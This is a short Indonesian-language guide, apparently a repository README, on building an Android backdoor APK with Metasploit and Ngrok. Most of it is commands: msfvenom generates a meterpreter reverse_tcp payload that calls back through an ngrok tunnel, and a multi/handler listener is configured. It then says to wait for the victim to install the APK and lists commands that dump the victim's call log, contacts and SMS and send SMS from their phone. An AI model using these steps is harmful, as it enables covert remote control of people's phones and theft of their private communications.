# Backdoor-APK
Cara Membuat Backdoor Untuk Android Dengan Metaspolit Dan Ngrok

**1. Install Metasploit**

**2. Install Ngrok**

**3. Buat Akun Ngrok**

**4. Masukkan Token Ngrok**
<br> $./ngrok authtoken 'Masukkan Token';

**5. Buat Port Ngrok**
<br> $./ngrok http 4455

**6. Melihat Status Ngrok**
<br> $ngrok tcp 4455 (port sesuai yang kita buat di awal)

**7. Jalankan Metasploit**
<br> $msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11610 R > /home/x-ploit001/Backdoor.apk
<br> Ket. Untuk LHOST dan LPORT diambil dari forwarding status ngrok

**8. Menjalankan Msfconsole**
<br> $msfconsole

**9. EKSEKUSI**
<br> msf > use multi/handler
<br> msf exploit(muti/handler) > set payload android/meterpreter/reverse_tcp
<br> msf exploit(muti/handler) > set lhost 0.0.0.0
<br> msf exploit(muti/handler) > set lport 4455
<br> msf exploit(muti/handler) > exploit

**10. Menunggu Korban Install APK**
**11. Perintah Remoting**
<br> dump_callog (Mendapatkan log panggilan di hp korban)
<br> dump_contacs (Mendapatkan kontak di hp korban)
<br> dump_sms (Mendapatkan sms masuk dan keluar di hp korban)
<br> send_sms (Mengirim sms menggunakan hp korban)
